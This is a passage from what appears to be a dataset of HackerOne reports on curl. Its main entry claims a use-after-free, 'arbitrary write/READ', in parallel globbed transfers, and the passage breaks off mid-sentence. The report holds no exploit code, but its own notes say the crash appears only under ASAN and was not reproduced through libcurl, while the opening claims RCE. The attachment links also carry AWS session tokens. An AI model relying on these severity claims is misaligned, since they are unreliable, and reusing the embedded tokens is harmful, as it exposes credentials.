RCE: Heap layout manipulation may enable code execution in specific scenarios\n> Denial of Service: Memory access violations cause application crashes\n> Data Corruption: Heap metadata corruption affects application stability\n\n### Attack Scenarios:\n\n> Applications that accept user-controlled POST data sizes\n> Network services processing untrusted HTTP POST parameters\n> Any application where attackers can influence both POST data and size parameters\n\n### Real-World Relevance:\n\n> This affects legitimate use cases where applications might:\n> Truncate or pad POST data based on protocol requirements\n> Process variable-length content with fixed-size headers\n> Handle network protocols with length prefixes"
},
{
    "url": "https://hackerone.com/reports/3283232",
    "original_report": "Summary:\n--------\n\n* Use-After-Free vulnerability that leads to arbitrary write/READ\n\nYES, I used IA along with mermaind editor (online one) to generate this graph that show these paths for (allocation, free and use after free)\n[bug\\_svg.png (F4637660)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bl9zn9hw6frbbku073mwfugtfm8l?response-content-disposition=attachment%3B%20filename%3D%22bug_svg.png%22%3B%20filename%2A%3DUTF-8%27%27bug_svg.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da62cd0c6c338e89424ca3ec5cec128ea0d31a3ef7793bae738727ad8ef4ed62): bug\\_svg.png\n\nAffected version\n----------------\n\n* curl 8.13.0 (x86\\_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.5 libpsl/0.21.2 (Arbitrary write/READ)\n\n* [asan\\_crash\\_log\\_curl\\_8.13.0-Arbitrary-READ.log (F4637640)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ly7indmyy8vp7osrcuq3ehkazkut?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.13.0-Arbitrary-READ.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.13.0-Arbitrary-READ.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9568f1d737e3c119acdced874d22cf461b937da1434f8e0ecd17a160b697a841): asan\\_crash\\_log\\_curl\\_8.13.0-Arbitrary-READ.log\n* [asan\\_crash\\_log\\_curl\\_8.13.0-Arbitrary-WRITE.log (F4637641)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wbq1s1q7jpcdll4s1yadrfkf9d5t?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.13.0-Arbitrary-WRITE.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.13.0-Arbitrary-WRITE.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ca95cc667ced687767d366f78793de783d0bbad3412f7012726fbc43622851f0): asan\\_crash\\_log\\_curl\\_8.13.0-Arbitrary-WRITE.log\n  + curl 8.14.0 (x86\\_64-pc-linux-gnu) libcurl/8.14.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.5 libpsl/0.21.2 (Arbitrary write/READ)\n* [asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-READ.log (F4637642)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nch5z64vxkqf6qtvghpaqj9iqk72?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.14.0-Arbitrary-READ.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.14.0-Arbitrary-READ.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=926eaa8a7d918c32d30bd6b1e583e6d91c9ada01718c380d34b0881fa31476a5): asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-READ.log\n* [asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-WRITE.log (F4637643)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4a8mfb8kr2ju62k0kc4zb68g3nhv?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.14.0-Arbitrary-WRITE.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.14.0-Arbitrary-WRITE.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48a04f5bb91e0d8ea36dedb1f2c488902e33e184ec2cb2143eed2e96342120f2): asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-WRITE.log\n  + curl 8.15.0 (x86\\_64-pc-linux-gnu) libcurl/8.15.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.5 libpsl/0.21.2 (only Arbitrary write )\n* [asan\\_crash\\_log\\_curl\\_8.15.0-Arbitrary-WRITE.log (F4637644)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bq2elx3orjroltab3l2ykgsxfao7?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.15.0-Arbitrary-WRITE.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.15.0-Arbitrary-WRITE.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=68b16955bb7ac8ce2881cad9836de7caa79100c603863d49331543de4eff79f4): asan\\_crash\\_log\\_curl\\_8.15.0-Arbitrary-WRITE.log\n  => tested on :\n\n* All version listed above tested on Linux kali 6.3.0-kali1-amd64 [#1](/reports/1) SMP PREEMPT\\_DYNAMIC Debian 6.3.7-1kali1.\n* Ubuntu 24.04.1 (I only tested curl version 8.14.0 on it)\n* I used curl version 8.14.0 to inverstigate the root cause of this, so there might be slight changed in line numbers when I refer to some fucntions.\n\nSteps To Reproduce:\n-------------------\n\n1. Download the last target version from github and unizp it:\n\n   wget <https://github.com/curl/curl/releases/download/curl-8_14_0/curl-8.14.0.zip> && unzip curl-8.14.0.zip && cd curl-8.14.0\n2. Build and install:\n\nPlease refer to the crash file [asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-WRITE.log (F4637643)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4a8mfb8kr2ju62k0kc4zb68g3nhv?response-content-disposition=attachment%3B%20filename%3D%22asan_crash_log_curl_8.14.0-Arbitrary-WRITE.log%22%3B%20filename%2A%3DUTF-8%27%27asan_crash_log_curl_8.14.0-Arbitrary-WRITE.log&response-content-type=text%2Fx-log&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024821Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48a04f5bb91e0d8ea36dedb1f2c488902e33e184ec2cb2143eed2e96342120f2): asan\\_crash\\_log\\_curl\\_8.14.0-Arbitrary-WRITE.log\n\nUse this is you want to stop the loop when the crash occurs:\n\nWe can also use config file , write a config file (conf.txt) :\n\nThen execute :\n\nTo stop the loop when the crash detected :\n\nTriaging the crash:\n-------------------\n\nFor traiging the crash I mainly focused on ASAN output alongs with manual code review , Also the coredump file was helpful (couldn't upload it cuz it's 830 MB in size).\n\n* to enable it (debian based os) :\n\n* main transfer loop :\n\n* when curl called in parallel mode the function `curl_multi_perform()` is used.\n\n  + As crash output shows, when `curl_easy_init()` function was called, it uses Curl\\_open(&data) function to allocate Curl\\_easy struct `(data = calloc(1, sizeof(struct Curl_easy));)` then assign it to `&data` that was passed to `Curl_open()`.\n\n* Once the transfer completed the `post_per_transfer()` function was called within `check_finished(s)`, which invokes `curl_easy_cleanup()`, which calls `Curl_close(&data)` and that frees the data components and null their pointers using Curl\\_safefree(), Curl\\_freeset(),etc, then frees data itself which deallocates the entire struct Curl\\_easy data including its state.timenode( struct Curl\\_tree timenode) .\n\n* At multi.c:3474, `Curl_expire_clear()` function calls Curl\\_splayremove(multi->timetree, &data->state.timenode,&multi->timetree)` passing the same pointer (&data->state.timenode) that was freed as second argument.\n* At /splay.c:234, the `Curl_splayremove()` function does pointers manipulation (assuming passed removenode is a valid node in the tree), which writes into freed heap memory (use-after-free -> arbitrary write).\n\nNotes:\n------\n\n* Since those bracket ranges \"[1-10]\" are purely a feature of the curl command line (and config file) - known by URL globbing - , and these types of urls aren't supported by libcurl APIs, this bug occurs when curl binary or libcurl API parses a bracket-range URL(expanding the range into an array) then uses them in parallel mode (-Z) with curl\\_multi\\_perform, curl\\_multi\\_poll,etc.\n* The crash is triggered when using the --max-time option set to a relatively low value (0.01 with [1-10]; 0.1 with [1-100] ranges in the URL also triggers the bug)\n* I believe that we can reprodoce this issue and reach the vulnerable path using libcurl APIs, I tried with 10-at-a-time.c with editing urls array to parsed one by --libcurl options and add other options (like CURLOPT\\_NOPROGRESS for --silent and (easy\\_handle,CURLOPT\\_TIMEOUT\\_MS,10L) for max-time 0.01 ) but it didn't work. cuz the behavior of --max-time in curl command applied on the entire URL (with bracket ranges), so it needs more work on this .\n* For clarity I still haven't triggered the the same crash with C code (using libcurl <curl/curl.h>).\n* This bug only triggerd with Address Sanitizers enabled, and doesn't necessarily lead to app's crash, without ASAN enabled it's only corrupts the heeap with some low memory addresses (curl version 8.15.0) and abort in (curl version 8.14.0) which lead to segfault that might crash the app when it runs for more several iterations, which could make the perfect attack as normal curl operation with no obvious indicators (but quite challaging to debug cause we can't use gdb and strace when asan enabled)\n* This bug also can be triggered with additional functionalities 